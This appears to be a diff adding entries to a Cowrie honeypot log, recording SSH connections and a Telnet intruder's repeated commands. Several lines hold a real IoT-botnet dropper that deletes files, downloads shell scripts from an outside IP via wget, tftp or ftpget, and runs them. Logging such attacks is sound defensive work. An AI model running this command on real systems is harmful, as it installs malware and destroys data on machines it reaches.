@@ -6703,3 +6703,46 @@
 2017-06-16T19:32:59+0000 [HoneyPotSSHTransport,44,185.38.148.238] avatar root logging out
 2017-06-16T19:32:59+0000 [HoneyPotSSHTransport,44,185.38.148.238] connection lost
 2017-06-16T19:32:59+0000 [HoneyPotSSHTransport,44,185.38.148.238] Connection lost after 22 seconds
+2017-06-16T19:33:16+0000 [CowrieTelnetTransport,55,65.19.239.117] CMD: sh || bash || shell
+2017-06-16T19:33:16+0000 [CowrieTelnetTransport,55,65.19.239.117] Command found: sh 
+2017-06-16T19:33:16+0000 [CowrieTelnetTransport,55,65.19.239.117] Command found: bash 
+2017-06-16T19:33:16+0000 [CowrieTelnetTransport,55,65.19.239.117] Command not found: shell
+2017-06-16T19:33:21+0000 [CowrieTelnetTransport,55,65.19.239.117] CMD: cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://179.43.141.235/bi.sh || wget http://179.43.141.235/bi.sh || busybox tftp -r bi2.sh -g 179.43.141.235 || tftp -r bi2.sh -g 179.43.141.235 || busybox tftp 179.43.141.235 -c get bi3.sh || tftp 179.43.141.235 -c get bi3.sh || busybox ftpget 179.43.141.235 bi4.sh bi4.sh || ftpget 179.43.141.235 bi4.sh bi4.sh;sh bi.sh || sh bi2.sh || sh bi3.sh || sh bi4.sh;rm -f *;exit
+2017-06-16T19:33:21+0000 [CowrieTelnetTransport,55,65.19.239.117] Command found: cd /tmp
+2017-06-16T19:33:21+0000 [CowrieTelnetTransport,55,65.19.239.117] Command found: cd /var/run
+2017-06-16T19:33:21+0000 [CowrieTelnetTransport,55,65.19.239.117] Command found: cd /dev/shm
+2017-06-16T19:33:21+0000 [CowrieTelnetTransport,55,65.19.239.117] Command found: cd /mnt
+2017-06-16T19:33:21+0000 [CowrieTelnetTransport,55,65.19.239.117] Command found: cd /var
+2017-06-16T19:33:21+0000 [CowrieTelnetTransport,55,65.19.239.117] Command found: rm -f /var/log /var/run /var/mail /var/tmp /var/opt /var/local /var/backups /var/spool /var/lock /var/lib /var/cache
+2017-06-16T19:33:21+0000 [CowrieTelnetTransport,55,65.19.239.117] Command found: busybox wget http://179.43.141.235/bi.sh
+2017-06-16T19:33:21+0000 [CowrieTelnetTransport,55,65.19.239.117] Command found: wget http://179.43.141.235/bi.sh
+2017-06-16T19:33:21+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://179.43.141.235/bi.sh>
+2017-06-16T19:33:23+0000 [CowrieTelnetTransport,55,65.19.239.117] QUEUED INPUT: cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://179.43.141.235/bi.sh || wget http://179.43.141.235/bi.sh || busybox tftp -r bi2.sh -g 179.43.141.235 || tftp -r bi2.sh -g 179.43.141.235 || busybox tftp 179.43.141.235 -c get bi3.sh || tftp 179.43.141.235 -c get bi3.sh || busybox ftpget 179.43.141.235 bi4.sh bi4.sh || ftpget 179.43.141.235 bi4.sh bi4.sh;sh bi.sh || sh bi2.sh || sh bi3.sh || sh bi4.sh;rm -f *;exit
+2017-06-16T19:33:25+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:52518 (10.8.41.81:2222) [session: d488f48a]
+2017-06-16T19:33:29+0000 [HoneyPotSSHTransport,45,113.195.145.52] Remote SSH version: SSH-2.0-PUTTY
+2017-06-16T19:33:29+0000 [HoneyPotSSHTransport,45,113.195.145.52] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-16T19:33:29+0000 [HoneyPotSSHTransport,45,113.195.145.52] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-16T19:33:29+0000 [HoneyPotSSHTransport,45,113.195.145.52] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-16T19:33:30+0000 [CowrieTelnetTransport,55,65.19.239.117] QUEUED INPUT: cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://179.43.141.235/bi.sh || wget http://179.43.141.235/bi.sh || busybox tftp -r bi2.sh -g 179.43.141.235 || tftp -r bi2.sh -g 179.43.141.235 || busybox tftp 179.43.141.235 -c get bi3.sh || tftp 179.43.141.235 -c get bi3.sh || busybox ftpget 179.43.141.235 bi4.sh bi4.sh || ftpget 179.43.141.235 bi4.sh bi4.sh;sh bi.sh || sh bi2.sh || sh bi3.sh || sh bi4.sh;rm -f *;exit
+2017-06-16T19:33:33+0000 [HoneyPotSSHTransport,45,113.195.145.52] NEW KEYS
+2017-06-16T19:33:35+0000 [CowrieTelnetTransport,55,65.19.239.117] QUEUED INPUT: cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://179.43.141.235/bi.sh || wget http://179.43.141.235/bi.sh || busybox tftp -r bi2.sh -g 179.43.141.235 || tftp -r bi2.sh -g 179.43.141.235 || busybox tftp 179.43.141.235 -c get bi3.sh || tftp 179.43.141.235 -c get bi3.sh || busybox ftpget 179.43.141.235 bi4.sh bi4.sh || ftpget 179.43.141.235 bi4.sh bi4.sh;sh bi.sh || sh bi2.sh || sh bi3.sh || sh bi4.sh;rm -f *;exit
+2017-06-16T19:33:38+0000 [CowrieTelnetTransport,55,65.19.239.117] QUEUED INPUT: cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://179.43.141.235/bi.sh || wget http://179.43.141.235/bi.sh || busybox tftp -r bi2.sh -g 179.43.141.235 || tftp -r bi2.sh -g 179.43.141.235 || busybox tftp 179.43.141.235 -c get bi3.sh || tftp 179.43.141.235 -c get bi3.sh || busybox ftpget 179.43.141.235 bi4.sh bi4.sh || ftpget 179.43.141.235 bi4.sh bi4.sh;sh bi.sh || sh bi2.sh || sh bi3.sh || sh bi4.sh;rm -f *;exit
+2017-06-16T19:33:44+0000 [CowrieTelnetTransport,55,65.19.239.117] QUEUED INPUT: cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://179.43.141.235/bi.sh || wget http://179.43.141.235/bi.sh || busybox tftp -r bi2.sh -g 179.43.141.235 || tftp -r bi2.sh -g 179.43.141.235 || busybox tftp 179.43.141.235 -c get bi3.sh || tftp 179.43.141.235 -c get bi3.sh || busybox ftpget 179.43.141.235 bi4.sh bi4.sh || ftpget 179.43.141.235 bi4.sh bi4.sh;sh bi.sh || sh bi2.sh || sh bi3.sh || sh bi4.sh;rm -f *;exit
+2017-06-16T19:33:46+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:15562 (10.8.41.81:2222) [session: 0fa0b7c6]
+2017-06-16T19:33:50+0000 [CowrieTelnetTransport,55,65.19.239.117] QUEUED INPUT: cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://179.43.141.235/bi.sh || wget http://179.43.141.235/bi.sh || busybox tftp -r bi2.sh -g 179.43.141.235 || tftp -r bi2.sh -g 179.43.141.235 || busybox tftp 179.43.141.235 -c get bi3.sh || tftp 179.43.141.235 -c get bi3.sh || busybox ftpget 179.43.141.235 bi4.sh bi4.sh || ftpget 179.43.141.235 bi4.sh bi4.sh;sh bi.sh || sh bi2.sh || sh bi3.sh || sh bi4.sh;rm -f *;exit
+2017-06-16T19:33:51+0000 [-] Command found: wget http://179.43.141.235/bi.sh
+2017-06-16T19:33:51+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://179.43.141.235/bi.sh>
+2017-06-16T19:33:51+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://179.43.141.235/bi.sh>
+2017-06-16T19:33:52+0000 [CowrieTelnetTransport,55,65.19.239.117] QUEUED INPUT: cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://179.43.141.235/bi.sh || wget http://179.43.141.235/bi.sh || busybox tftp -r bi2.sh -g 179.43.141.235 || tftp -r bi2.sh -g 179.43.141.235 || busybox tftp 179.43.141.235 -c get bi3.sh || tftp 179.43.141.235 -c get bi3.sh || busybox ftpget 179.43.141.235 bi4.sh bi4.sh || ftpget 179.43.141.235 bi4.sh bi4.sh;sh bi.sh || sh bi2.sh || sh bi3.sh || sh bi4.sh;rm -f *;exit
+2017-06-16T19:33:57+0000 [HoneyPotSSHTransport,46,113.195.145.52] Remote SSH version: SSH-2.0-PUTTY
+2017-06-16T19:33:57+0000 [HoneyPotSSHTransport,46,113.195.145.52] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-16T19:33:57+0000 [HoneyPotSSHTransport,46,113.195.145.52] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-16T19:33:57+0000 [HoneyPotSSHTransport,46,113.195.145.52] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-16T19:33:57+0000 [HoneyPotSSHTransport,46,113.195.145.52] connection lost
+2017-06-16T19:33:57+0000 [HoneyPotSSHTransport,46,113.195.145.52] Connection lost after 10 seconds
+2017-06-16T19:33:58+0000 [HoneyPotSSHTransport,45,113.195.145.52] starting service 'ssh-userauth'
+2017-06-16T19:33:58+0000 [HoneyPotSSHTransport,45,113.195.145.52] Got remote error, code 11
+	reason: 
+2017-06-16T19:33:58+0000 [HoneyPotSSHTransport,45,113.195.145.52] connection lost
+2017-06-16T19:33:58+0000 [HoneyPotSSHTransport,45,113.195.145.52] Connection lost after 33 seconds
+2017-06-16T19:33:59+0000 [CowrieTelnetTransport,55,65.19.239.117] QUEUED INPUT: cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://179.43.141.235/bi.sh || wget http://179.43.141.235/bi.sh || busybox tftp -r bi2.sh -g 179.43.141.235 || tftp -r bi2.sh -g 179.43.141.235 || busybox tftp 179.43.141.235 -c get bi3.sh || tftp 179.43.141.235 -c get bi3.sh || busybox ftpget 179.43.141.235 bi4.sh bi4.sh || ftpget 179.43.141.235 bi4.sh bi4.sh;sh bi.sh || sh bi2.sh || sh bi3.sh || sh bi4.sh;rm -f *;exit
